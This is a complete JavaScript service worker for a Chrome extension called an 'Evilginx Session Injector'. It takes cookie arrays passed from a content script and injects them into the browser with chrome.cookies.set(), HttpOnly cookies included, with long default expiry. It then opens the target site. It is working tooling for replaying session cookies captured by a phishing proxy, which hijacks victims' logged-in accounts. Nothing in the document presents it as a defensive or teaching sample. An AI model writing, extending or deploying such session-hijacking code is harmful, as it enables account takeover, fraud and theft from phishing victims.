// Evilginx Session Injector — background service worker
// Receives cookie arrays from the content script and injects them via
// chrome.cookies.set(), which can set HttpOnly cookies that JS cannot touch.

chrome.runtime.onMessage.addListener((msg, sender, sendResponse) => {
  if (msg.action !== 'inject') return false;

  const { cookies, targetUrl } = msg;
  const results = { success: 0, failed: 0, errors: [] };

  (async () => {
    for (const cookie of cookies) {
      const cleanDomain = cookie.domain.replace(/^\./, '');
      const scheme = cookie.secure ? 'https' : 'http';
      const url = `${scheme}://${cleanDomain}${cookie.path || '/'}`;

      // Chrome cookies API sameSite values: "no_restriction" | "lax" | "strict" | "unspecified"
      let sameSite = 'lax';
      if (cookie.sameSite) {
        const s = cookie.sameSite.toLowerCase();
        if (s === 'strict') sameSite = 'strict';
        else if (s === 'none' || s === 'no_restriction') sameSite = 'no_restriction';
        else sameSite = 'lax';
      }

      const details = {
        url,
        name:           cookie.name,
        value:          cookie.value,
        domain:         cookie.domain,
        path:           cookie.path || '/',
        secure:         cookie.secure  || false,
        httpOnly:       cookie.httpOnly || false,
        sameSite,
        expirationDate: cookie.expirationDate || (Math.floor(Date.now() / 1000) + 86400 * 365),
      };

      try {
        const result = await chrome.cookies.set(details);
        if (result) {
          results.success++;
        } else {
          results.failed++;
          results.errors.push(`${cookie.name} @ ${cleanDomain}: set returned null`);
        }
      } catch (e) {
        results.failed++;
        results.errors.push(`${cookie.name} @ ${cleanDomain}: ${e.message}`);
      }
    }

    if (targetUrl) {
      await chrome.tabs.create({ url: targetUrl, active: true });
    }

    sendResponse(results);
  })();

  return true; // keep message channel open for async response
});
